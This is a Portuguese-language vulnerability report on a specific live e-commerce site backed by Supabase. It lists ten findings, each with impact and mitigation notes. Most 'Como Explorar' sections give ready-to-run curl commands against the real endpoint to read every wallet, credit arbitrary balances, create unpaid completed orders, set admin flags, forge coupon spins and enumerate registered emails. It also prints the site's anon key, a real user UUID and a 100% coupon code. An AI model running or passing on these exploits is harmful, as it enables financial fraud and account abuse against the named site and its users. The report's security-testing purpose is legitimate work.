# 🔴 FALHA 1: RLS Quebrado — user_wallets sem auth.uid()

**Gravidade:** 🔴 CRÍTICA  
**Local:** Tabela `public.user_wallets` no Supabase  
**Endpoint:** `https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/user_wallets`

---

## Descrição

A Row-Level Security (RLS) da tabela `user_wallets` está configurada sem a checagem `auth.uid()`. Isso permite que QUALQUER usuário autenticado consulte, crie e modifique carteiras de QUALQUER outro usuário.

## Como Explorar

### 1. Listar todas as carteiras (inclusive de outros usuários)

```bash
curl -s "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/user_wallets" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $TOKEN"
```

### 2. Adicionar saldo a qualquer carteira

```bash
curl -s -X POST "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/user_wallets" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=representation" \
  -d '{"user_id":"3b910ad3-b61f-4b0b-b641-162de4eb0b86","balance":50000}'
```

### 3. Modificar saldo de qualquer carteira

```bash
curl -s -X PATCH "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/user_wallets?user_id=eq.TARGET_UUID" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"balance":999999}'
```

## Impacto

- **CRIAÇÃO DE DINHEIRO**: Atacante pode creditar R$ infinitos na própria carteira
- **ROUBO DE SALDO**: Atacante pode zerar carteiras de outros usuários
- **FRAUDE**: Compras podem ser feitas sem pagamento real usando saldo fraudulento
- **DANO FINANCEIRO**: Prejuízo direto ao proprietário do site com ordens "pagas" via wallet fraudulenta

## Mitigação

Adicionar política RLS na tabela `user_wallets`:
```sql
CREATE POLICY "users_own_wallet" ON public.user_wallets
  FOR ALL USING (auth.uid() = user_id);
```

---

# 🔴 FALHA 2: Criação de Orders sem Pagamento

**Gravidade:** 🔴 CRÍTICA  
**Local:** Tabela `public.orders`  
**Endpoints:** `POST /rest/v1/orders`, `POST /api/checkout/create`

---

## Descrição

O sistema permite criar ordens com status `completed` diretamente via API do Supabase, sem passar pelo fluxo de pagamento (PIX). Qualquer usuário autenticado pode inserir ordens como se tivessem sido pagas.

## Como Explorar

```bash
# Criar ordem já como "completed" sem pagamento
curl -s -X POST "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/orders" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=representation" \
  -d '{
    "user_id":"SEU_UUID",
    "items":[{"id":123,"name":"Conta Premium","price":150}],
    "total":150,
    "status":"completed",
    "payment_method":"wallet"
  }'
```

## Impacto

- **FRAUDE TOTAL**: Itens podem ser obtidos sem pagamento
- **ESGOTAMENTO DE ESTOQUE**: Atacante pode "comprar" todas as contas do estoque
- **REVENDA**: Contas obtidas de graça podem ser revendidas em outros mercados

## Mitigação

- Validar status da ordem APENAS server-side, após confirmação do gateway de pagamento
- Remover permissão de INSERT direto na tabela `orders` para usuários comuns
- Implementar webhook de confirmação de pagamento PIX

---

# 🟡 FALHA 3: Chave Anon do Supabase Exposta

**Gravidade:** 🟡 Média  
**Local:** HTML da página inicial (variável NEXT_PUBLIC_SUPABASE_ANON_KEY)

---

## Descrição

A chave anônima do Supabase está hardcoded no bundle JavaScript (público). Embora isso seja considerado "normal" pela documentação do Supabase (chave anon é feita pra ser pública), ela permite acesso não autenticado a todas as tabelas RLS e à API GoTrue.

## Chave Exposta

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFoZnZpeXlrcGFsanp4Y21keWZoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjIzMDksImV4cCI6MjA5NDUzODMwOX0.
YzeYMHYwJYM-FMQwDFXTLAM7CzB-M0f3zi67-7ox5bU
```

## Impacto

- Permite acesso à API GoTrue (criar conta, login, etc.)
- Permite consultar tabelas com RLS aberta
- Base para ataques de JWT confusion (se o secret for fraco)

## Mitigação

- Usar variáveis de ambiente (já é NEXT_PUBLIC_ — ok para Next.js)
- Rotacionar a chave regularmente
- Garantir que RLS esteja correta em TODAS as tabelas

---

# 🟡 FALHA 4: Metadados de Usuário Modificáveis via GoTrue

**Gravidade:** 🟡 Média  
**Local:** `PUT /auth/v1/user` (GoTrue API)

---

## Descrição

Usuários autenticados podem modificar seus próprios `user_metadata` através da API GoTrue. Embora `app_metadata` exija privilégios administrativos, os metadados de usuário podem conter flags de permissão que alguns sistemas usam para controle de acesso.

## Como Explorar

```bash
# Adicionar flags de admin nos user_metadata
curl -s -X PUT "https://ahfviyykpaljzxcmdyfh.supabase.co/auth/v1/user" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"data":{"role":"admin","is_admin":true,"access_level":"admin"}}'
```

## Impacto

- Dependendo da implementação, flags em user_metadata podem conceder privilégios
- No caso do Legas Forn, o admin panel verifica APENAS `app_metadata` e é imune
- Outros sistemas no ecossistema podem usar `user_metadata` para autorização

## Mitigação

- Nunca usar `user_metadata` para decisões de autorização no servidor
- Validar permissões sempre via `app_metadata` (que requer service_role key)
- Implementar middleware de autorização centralizado

---

# 🟡 FALHA 5: Roda da Sorte Manipulável via API

**Gravidade:** 🟡 Média  
**Local:** `POST /api/wheel/spin`

---

## Descrição

A roda da sorte pode ser chamada diretamente via API, e os registros de spin podem ser inseridos diretamente na tabela `wheel_spins` com qualquer tipo de recompensa desejada.

## Como Explorar

```bash
# Chamar a roleta diretamente
curl -s -X POST "https://legasforn.com.br/api/wheel/spin" \
  -H "Cookie: sb-ahfviyykpaljzxcmdyfh-auth-token=$COOKIE"

# Inserir spin manual com recompensa customizada
curl -s -X POST "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/wheel_spins" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"user_id":"SEU_UUID","reward_type":"coupon_20","reward_value":20,"coupon_code":"HACK20"}'
```

## Impacto

- Permite gerar cupons de desconto ilimitados
- Inserir registros falsos na tabela de spins
- Abusar do sistema de recompensas

## Mitigação

- Validar servidor-side que o usuário tem direito a girar (cooldown/limite)
- Não permitir INSERT direto na tabela `wheel_spins` sem RLS
- Verificar integridade dos dados (um spin não pode ser inserido manualmente)

---

# 🟡 FALHA 6: Enumeração de Usuários via Signup

**Gravidade:** 🟡 Média  
**Local:** `POST /auth/v1/signup`

---

## Descrição

O Supabase retorna mensagens de erro diferentes para emails existentes vs. não existentes, permitindo enumeração de contas.

## Como Explorar

```bash
# Email existente → "User already registered"
curl -s -X POST "https://ahfviyykpaljzxcmdyfh.supabase.co/auth/v1/signup" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@legasforn.com.br","password":"teste123"}'
# Resposta: {"code":422,"msg":"User already registered"}

# Email não existente → cria conta com sucesso
curl -s -X POST "https://ahfviyykpaljzxcmdyfh.supabase.co/auth/v1/signup" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"aleatorio123456@teste.com","password":"teste123"}'
# Resposta: 200 com dados do usuário
```

## Impacto

- Atacante pode descobrir quais emails estão cadastrados na plataforma
- Pode ser usado para encontrar emails de administradores
- Base para ataques de phishing direcionados

## Mitigação

- Supabase não oferece mitigação nativa para isso
- Configurar rate limiting no projeto
- Usar "email confirmation required" para evitar criação automática

---

# 🟡 FALHA 7: Cookies de Autenticação sem HttpOnly

**Gravidade:** 🟡 Média  
**Local:** Cookie `sb-ahfviyykpaljzxcmdyfh-auth-token`

---

## Descrição

O cookie de autenticação do Supabase SSR é definido na primeira requisição SEM a flag HttpOnly, tornando-o acessível via JavaScript. O valor do cookie contém o access_token JWT e refresh_token.

## Como Explorar

```javascript
// Malicious script injected via XSS
document.cookie
// Retorna: "sb-ahfviyykpaljzxcmdyfh-auth-token.0=base64-..."
```

## Impacto

- Se houver qualquer XSS no site, o atacante rouba o token de autenticação
- Refresh token permite login persistente mesmo após troca de senha

## Mitigação

- Configurar `httpOnly: true` no storage do Supabase SSR
- Configurar `sameSite: 'lax'` ou `'strict'`

---

# 🟢 FALHA 8: Tech Stack & Build ID Expostos

**Gravidade:** 🟢 Baixa  
**Local:** Headers HTTP, /_next/static/...

---

## Descrição

O servidor expõe diversas informações que facilitam fingerprinting:

- Build ID no caminho dos chunks: `/_next/static/chunks/` com hash único
- Headers de framework Next.js
- Caminho dos bundles JS com IDs numéricos
- Estrutura de diretórios do Turbopack

## Impacto

- Facilita reconhecimento para ataques direcionados
- Versões de dependências podem ser identificadas

## Mitigação

- Next.js expõe isso por padrão — mitigar via Cloudflare/WAF

---

# 🟢 FALHA 9: Endpoints Admin Expostos (403/401)

**Gravidade:** 🟢 Baixa  
**Local:** `/api/admin/*`

---

## Descrição

Múltiplos endpoints administrativos existem e retornam mensagens de erro distintas:

```
GET /api/admin/users     → 403 "Acesso negado"  (autenticado, role check falhou)
GET /api/admin/orders    → 403 "Acesso negado"
GET /api/admin/stats     → 403 "Acesso negado"
GET /api/admin/analytics → 403 "Acesso negado"
GET /api/admin/coupons   → 403 "Acesso negado"
GET /api/admin/users/role → 403 "Acesso negado"
```

## Impacto

- Revela existência de endpoints administrativos
- Diferença entre 401 (não autenticado) e 403 (não autorizado) permite identificar usuários válidos

## Mitigação

- Consolidar todas as respostas de erro em mensagens genéricas (ex: sempre 404)
- Implementar autenticação antes do roteamento

---

# 🟡 FALHA 10: Cupom INSTA5 com 100% sem Limite de Uso

**Gravidade:** 🟡 Média  
**Local:** Tabela `public.coupons`

---

## Descrição

O cupom `INSTA5` existe no banco com `discount_value: 100%` (desconto total) e `max_uses: 100`. Embora o servidor provavelmente limite o desconto máximo a 15% (como outros cupons), a configuração no banco permite abuso se o limite não for verificado server-side.

## Como Explorar

```
Cupom: INSTA5
Desconto: 100%
Usos: 0/100
Valor mínimo: R$10
```

## Impacto

- Se o servidor não capar o desconto, é possível comprar itens de graça
- Pode ser usado em combinação com outras falhas

## Mitigação

- Validar desconto máximo server-side (atualmente parece limitado a 15%)
- Remover ou ajustar cupons de 100% no banco de dados
